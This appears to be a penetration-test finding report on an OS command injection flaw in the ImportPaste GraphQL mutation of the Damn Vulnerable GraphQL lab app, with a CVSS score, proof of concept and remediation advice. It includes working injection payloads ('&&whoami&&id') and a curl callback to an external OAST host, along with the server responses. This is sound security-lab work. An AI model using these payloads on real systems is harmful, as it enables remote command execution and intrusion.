# DVGA-007. OS Command Injection via ImportPaste `path` Variable

## Severity

Critical

CVSS v3.1 Score: 9.8(Critical)

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Overall CVSS Calculation

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSS Base Score:	        9.8
Impact Subscore:	        5.9
Exploitability Subscore:	3.9
CVSS Temporal Score:	    NA
CVSS Environmental Score:	NA
Modified Impact Subscore:	NA
Overall CVSS Score:	      9.8

## CWE

CWE-78 - Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)

## OWASP Mapping

* OWASP Top 10 2021: A03 - Injection

## Affected Endpoint

* `POST /graphql`

## Affected Operation

* `ImportPaste`

## Affected Variable

* `path`

## Description

While I was scanning the application using automated tools like `sqlmap` and other tools, suddenly I saw a variable value: `path`. What specially caught my attention was that it was using escape sequences to put `/` at first.

This somehow drew my attention, so I used OS command injection payloads and placed the following payload in the `path` variable:

```json
"path":"\\/raw/m6GHCKJ2&&whoami&&id"
```

The application processed the payload and returned the output of the injected commands in the response:

```text
Damn Vulnerable GraphQLdvga
uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)
```

The response clearly shows that the `whoami` and `id` commands were executed on the server.

After confirming this, I took another Burp hit and tested the same `path` variable with an OAST callback:

```json
"path":"\\/raw/m6GHCKJ2&&curl w63cil11ytc8qwvtg4nkqt3u9lfc32rr.oastify.com"
```

The response was:

```text
Damn Vulnerable GraphQL<html><body>841b8pk676gxpd3z8v15tyzjjgigz</body></html>
```

This provided another confirmation that the injected `curl` command was executed from the server.

So, OS Command Injection (RCE) is successfully identified in the `/graphql` endpoint through the `path` variable of the `ImportPaste` mutation.

## Proof of Concept

The affected GraphQL mutation is:

```graphql
mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {
    importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {
      result
    }
}
```

Here, the testing was specifically focused on the `path` variable.

### OS Command Injection Payload

I placed the following payload in the `path` variable:

```json
"path":"\\/raw/m6GHCKJ2&&whoami&&id"
```

The important part of the payload was:

```text
&&whoami&&id
```

The server returned:

```http
HTTP/2 200 OK
Content-Type: application/json

{"data":{"importPaste":{"result":"Damn Vulnerable GraphQLdvga
uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)
"}}}
```

The output:

```text
uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)
```

confirms that the injected commands were executed on the server under the `dvga` user.

### OAST Confirmation

Taking a Burp hit, I then placed the following payload in the same `path` variable:

```json
"path":"\\/raw/m6GHCKJ2&&curl w63cil11ytc8qwvtg4nkqt3u9lfc32rr.oastify.com"
```

The server responded with:

```http
HTTP/2 200 OK
Content-Type: application/json

{"data":{"importPaste":{"result":"Damn Vulnerable GraphQL<html><body>841b8pk676gxpd3z8v15tyzjjgigz</body></html>"}}}
```

The OAST interaction provided additional confirmation that the injected `curl` command was executed by the server.

## Impact

This vulnerability allows an attacker to execute operating system commands through the `path` variable of the `ImportPaste` mutation.

Because the commands are executed on the server, an attacker could potentially:

* Execute arbitrary commands with the privileges of the application process.
* Read files accessible to the application user.
* Access environment variables and potentially exposed secrets.
* Modify or delete files accessible to the application.
* Make outbound requests from the server.
* Use the command execution as a starting point for further attacks.
* Potentially compromise the underlying host depending on the privileges of the application process.

During testing, I was able to successfully execute `whoami` and `id` and obtain the server-side user and group information.

## Evidence

All evidence for this finding is stored under:

```text
evidence/DVGA-007-OS-Command-Injection-via-ImportPaste-path
```

## Remediation

The main issue is that the user-controlled `path` variable is being processed in a way that allows OS commands to be injected and executed.

The application should not pass the `path` value directly into an operating system command or shell.

Recommended fixes:

1. Do not directly concatenate the `path` value into a shell command.
2. Validate the `path` value against the expected path format.
3. Make sure shell metacharacters such as `&`, `&&`, `;`, `|`, `$()`, backticks, and newline characters cannot be interpreted as commands.
4. If operating system command execution is required, use a safe process execution method where arguments are passed separately instead of through a shell.
5. Run the application with only the minimum operating system privileges required.
6. Restrict unnecessary outbound network access from the application server where possible.
